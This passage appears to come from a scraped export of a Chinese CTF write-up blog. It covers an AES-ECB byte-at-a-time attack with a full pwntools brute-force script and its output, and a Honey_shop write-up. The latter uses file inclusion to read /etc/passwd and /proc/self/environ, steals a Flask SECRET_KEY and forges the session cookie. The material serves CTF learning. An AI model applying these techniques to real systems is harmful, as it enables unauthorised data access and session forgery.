8060)print(&quot;encrypted_flag is:&quot; + s.recvline())def send_message(message): s.recv() s.sendline(message) s.recvline() encrypted = s.recvline() print(&quot;Encryped &#123;0&#125; is:&#123;1&#125;.Its length is &#123;2&#125;.Message length is &#123;3&#125;&quot;.format(message, encrypted, len(encrypted), len(message)))result=0for i in range(1,65): send_message(&quot;a&quot;*i) 结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;home&#x2F;tiaonmmn&#x2F;PycharmProjects&#x2F;python2&#x2F;byte_me.py[+] Opening connection to 127.0.0.1 on port 8060: Doneencrypted_flag is:1e7086115a9f43410dfdcfa01702b6f4a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dcEncryped a is:ff52d314fe1306fb890d7140fe9875e882e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 130.Message length is 1Encryped aa is:4f13a88b3aa5e816885649d346f56d5c5d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 130.Message length is 2Encryped aaa is:e310dde5a0593baec946ab994183741aecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 130.Message length is 3Encryped aaaa is:01abdc7751a9eea1afec0ab084e973a0b5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 130.Message length is 4Encryped aaaaa is:28505aca54d2ef9fe91165176bb429844214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 130.Message length is 5Encryped aaaaaa is:5034d975ff043ce8039993a0242950b02eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 130.Message length is 6Encryped aaaaaaa is:882cab2b25bdbfe8d663b3215f6ef5d875ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 130.Message length is 7Encryped aaaaaaaa is:d988fe442e1e627455822e16925b4a28d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 130.Message length is 8Encryped aaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f43eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 130.Message length is 9Encryped aaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 130.Message length is 10Encryped aaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 130.Message length is 11Encryped aaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 162.Message length is 12Encryped aaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 162.Message length is 13Encryped aaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f459994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 162.Message length is 14Encryped aaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f48cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 162.Message length is 15Encryped aaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f46885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 162.Message length is 16Encryped aaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 162.Message length is 17Encryped aaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 162.Message length is 18Encryped aaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 162.Message length is 19Encryped aaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f49579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 162.Message length is 20Encryped aaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f469bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 162.Message length is 21Encryped aaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 162.Message length is 22Encryped aaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f44bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 162.Message length is 23Encryped aaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 162.Message length is 24Encryped aaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 162.Message length is 25Encryped aaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 162.Message length is 26Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 162.Message length is 27Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 194.Message length is 28Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 194.Message length is 29Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 194.Message length is 30Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 194.Message length is 31Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 194.Message length is 32Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 194.Message length is 33Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 194.Message length is 34Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 194.Message length is 35Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 194.Message length is 36Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 194.Message length is 37Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 194.Message length is 38Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 194.Message length is 39Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 194.Message length is 40Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 194.Message length is 41Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 194.Message length is 42Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 194.Message length is 43Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 226.Message length is 44Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 226.Message length is 45Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 226.Message length is 46Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 226.Message length is 47Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 226.Message length is 48Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99f42e62f15dc036e1a09c389250015c1982e7e524dd98fc2fdcc877222107d63a7905145edc3016646ccb0926aa5b0e38bb947ba83c0bbfdf4fb4cac0913c0401.Its length is 226.Message length is 49Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e6430275a9bb274ee7e37b860e8d8a065d5215beb0324c26e9aad9e4a180134aafef6f401eb921e4662fd9daf49487ecd83d0116094263d3ee19e605aaaacb64.Its length is 226.Message length is 50Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99351e8889f4291b6d56c7e894aab91a48ecbb45a44ca607f028486521564f62b692cfec5b59fe47e23d85f02d8fdf41d317eaef4cd0ade581266903cf6cd12741.Its length is 226.Message length is 51Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999579199f4e69346a5fdc11d2e593c80ab5caaeb147b989f0b3a8385fcb94c223d36f07bec80fc2c2c53238d5d331ebe59aa484ffe4338af5df49d5b18b59171c.Its length is 226.Message length is 52Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9969bc2c9ea8182813544ba55ab1a963014214d7902976d7f23049246fb1829982b991a9db4b31c76b6968ed59867220336f7d115fe99d107cc8992648881bee0b.Its length is 226.Message length is 53Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d19681425feb1a0d02fdbe35823e06242eb454f8fe777cd13c211683850f931d56b98aa9ae125595949e0b278aa2735ff6e3c57ff639a9dccda67e712bc4c9bc.Its length is 226.Message length is 54Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a994bfa35fb255a71e08d82e8a75317654475ea0d5e5a9378aefc1c782a5a501be454c1c32ef9c518e149c3625dcfc247a50d29ba749068f3800165a8f22054dabe.Its length is 226.Message length is 55Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99dd9e5d3a378726db3c0b9e92b4a35d86d00ff7ab6874a4cc61fa46fca71b726aa8cf17aa77bfb5360cb92f4fa7e7e9cdfc433c70b9ee1e78c5a5064533da8d46.Its length is 226.Message length is 56Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a993eccbe78b8ae3903491e25ff706abd752b04d980aafa48393d75ff7484d5032d9c8d8d838fd5e44a9ecbc9aca2251bdb.Its length is 226.Message length is 57Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a999a19a618bd564f5fb30cea8e18abac12839b7746650d3f3e9456c32e799a752ce329679aaf6adcc40556ce46ed5df1bf.Its length is 226.Message length is 58Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99657c1732b2e4916e22bbf3dea339ee2dbdcaa652ec09315452cfa4b2dce4d8e52af2a3eccee542d42511f1138a6cdf73.Its length is 226.Message length is 59Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99d811b161afce4939967a4ae2a83c89b516a1ab0b723c549a8ea67b026444c8bc8a32af103de992b41efe193e5c2576deea95fe196998951a0f598a2e519925c7.Its length is 258.Message length is 60Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99e3eeb89f4ba128ce311b33787865b5d94ddc0480866840c8c811f80e1047ef216ffa19a23acfb23d21a49c6c90d027811d0f00affdfce4afa4b025d4457bd595.Its length is 258.Message length is 61Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a9959994a644d4aa519ead145821fa949b4e89e7c11851ae0d640631af0bdbeee8b73cfc452c87afa74e86731fe31c8558492adf99e7a0c109c5cb662db35c0ea5b.Its length is 258.Message length is 62Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a998cef101955556e5bcd064d2dcfcbbc421b182df74863e95ca0d83e75b6ce8b977e7cab1ba0f113d3fe6bc2409006e35829b76a13f2a170c50eaeffb470c38a60.Its length is 258.Message length is 63Encryped aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa is:97e13b7cedd005b0125a4be2af9dc1f4952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a99952e28f1b4f8a588b92fb1ded8716a996885b4e75c3d47d0dfeabd65836cf329a4b6a5a081935cca7a7f38977dd21cf8eb662dc55bd5e8813ff23ad4d50d5486cdadce02d6fd6be555365a42fed846dc.Its length is 258.Message length is 64[*] Closed connection to 127.0.0.1 port 8060Process finished with exit code 0 注意到每次“a”增加8位，密文的相同部分就会增加32位。那么我们猜测这个是ECB加密，因为ECB加密每次针对一组明文进行加密，且不会重用之前的密文结果。 但是为什么一个a与两个a具有完全不相同的结果，直到发送'a'*9的时候才稳定下来密文。那么就大胆猜测一下服务端加密的时候是把flag与我们输入的内容一起加密了，并且其组合方式应该是encrypt(random+input_string+flag)，因为flag在前的时候密文前半部分应该是稳定的，而每次连接服务的时候，到密文稳定的距离都不一样。 对于ECB模式，我们可以通过逐位爆破的方式得到明文。不考虑random区域并假设flag为flag{teststring_0123456789}。我们发送\"a\"*16，服务器实际加密的字符串是\"a\"*16+\"flag{teststring_0123456789}\"，可以得到第一个Block \"a\"*16的密文结果。那么发送\"a\"*15，服务器加密的就是\"a\"*15+\"flag{teststring_0123456789}\"，第一个Block的内容实际上是\"a\"*15+\"f\"，我们记下这个Block的密文结果。然后开始对第一个Block的最后一位进行爆破，当爆破到最后一位是\"f\"时发现与刚刚得到的结果一样。那么就证明flag的第一位是\"f\"。同样的，我们发送\"a\"*14，那么第一个Block实际上是\"a*14\"+\"fl\"， 我们已知flag第一位是\"f\"，那么发送\"a*14\"+\"f\"，并爆破最后一位，爆破到\"l\"发现结果一致，那么flag前两位是\"fl\"，如此循环。 那么当flag大于16位的时候，又怎么处理？假设flag为flag{teststring_0123456789}，上一段所述方法我们可以得到flag{teststring_。当我们发送'a'*15的时候，第一个Block内容是'a'*15+'f'，第二个Block内容为\"lag{testring_\"+\"0\"。那么我们爆破第二个Block的内容就可以了。 思路明确，那么我们就写脚本好了。对于random区域处理，通过判断什么时候密文前32位稳定就可以了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# coding=utf-8from pwn import *context.log_level = &#x27;debug&#x27;s = connect(&#x27;127.0.0.1&#x27;, 8060)s.recvline()def recv_encrypted(message): s.recv() s.sendline(message) s.recvline() return s.recvline()def get_pad(): print(&quot;[+] Getting pad.&quot;) pad = 0 for i in range(1, 30): message = &quot;a&quot; * i encrypted_prev = recv_encrypted(message) # get previous encrypted message message = &quot;a&quot; * (i + 1) encrypted_now = recv_encrypted(message) # get now encrypted message print(&quot;prev: &#123;0&#125;,now: &#123;1&#125;&quot;.format(encrypted_prev[0:31], encrypted_now[0:31])) if encrypted_prev[0:31] == encrypted_now[0:31]: pad = i break print(&quot;pad is &#123;0&#125;&quot;.format(pad)) return paddef brute_flag(pad): result = &quot;&quot; for rounds in range(0, 10): temp_result = &quot;&quot; # flag每一轮添加16位 random_char = random.choice(string.ascii_letters + string.digits) for a in range(15, -1, -1): initial_message = &quot;a&quot; * pad + random_char * a initial = recv_encrypted(initial_message) # 固定值 for i in &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~&#x27;: message = &quot;a&quot; * pad + (random_char * a) + result + temp_result + i # encrypt_range = slice(32 * (rounds + 1), 32 * (rounds + 2)) # [32:64] encrypt_message = recv_encrypted(message) print(&quot;message is :&#123;0&#125;,encrypted is :&#123;1&#125;,initial is :&#123;2&#125;,initial message is :&#123;3&#125;&quot;.format(message, encrypt_message, initial, initial_message)) if encrypt_message[encrypt_range] == initial[encrypt_range]: # 第一轮比较[32:64]，第二轮比较[64,96] temp_result += i break print(&quot;round &#123;0&#125; flag is: &#123;1&#125;&quot;.format(rounds, temp_result)) result += temp_result if &quot;&#125;&quot; in result: print(&quot;flag is :&#123;0&#125;&quot;.format(result)) breakbrute_flag(get_pad()) flag{e8b74d24-f749-49dc-a9a9-55b979567510}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"ECB","slug":"ECB","permalink":"http://tiaonmmn.github.io/tags/ECB/"}]},{"title":"PASECACTF-2019-Honey_shop","slug":"PASECACTF-2019-Honey-shop","date":"2019-10-19T05:24:26.000Z","updated":"2019-12-10T12:15:12.670Z","comments":true,"path":"2019/10/19/PASECACTF-2019-Honey-shop/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/","excerpt":"PASECA CTF 2019的Honey_shop。还算是简单。 打开网页，是个商店网页，我们拥有1336元，但是要购买Flag需要1337元。 我们注意到有一句“click to download our sweet images”，发现访问的是/download?image=2.jpg，这样就可能出现LFI。","text":"PASECA CTF 2019的Honey_shop。还算是简单。 打开网页，是个商店网页，我们拥有1336元，但是要购买Flag需要1337元。 我们注意到有一句“click to download our sweet images”，发现访问的是/download?image=2.jpg，这样就可能出现LFI。 我们成功读到了/etc/passwd，那么接下来读什么呢？目前我们也无法触发有关Flask的任何报错信息，找不到其路径。那就只能试着读一下/proc的相关信息了。 /proc/self/永远指向当前进程，我们尝试读一下environ文件，这记录着当前进程（本题而言是python）的环境变量信息。 看到有SECRET_KEY，猜测这是用来加密Flask的Cookie的。那么，Cookie我们就可以解密了。利用之前提到过的这个，我们可以解出Cookie的内容b'&#123;\"balance\":1336,\"purchases\":[]&#125;'，那么我们把balance改成1338就可以购买flag了。 需要注意的是那个脚本对Python版本有一定的限制，最好是在Python 3.6 Linux下运行。 flag{885c84f2-b753-435d-95e1-44de4614dbc3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Python.Flask","slug":"Python-Flask","permalink":"http://tiaonmmn.github.io/tags/Python-Flask/"},{"name":"Cookie","slug":"Cookie","permalink":"http://tiaonmmn.github.io/tags/Cookie/"},{"name":"LFI","slug":"LFI","permalink":"http://tiaonmmn.github.io/tags/LFI/"}]},{"title":"Balsn CTF 2019 Pyshv1","slug":"Balsn-CTF-2019-Pyshv1","date":"2019-10-11T13:21:42.000Z","updated":"2019-12-10T12:15:12.580Z","comments":true,"path":"2019/10/11/Balsn-CTF-2019-Pyshv1/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/11/Balsn-CTF-2019-Pyshv1/","excerpt":"Balsn CTF 2019的Pyshv1和2。Python沙盒的题。 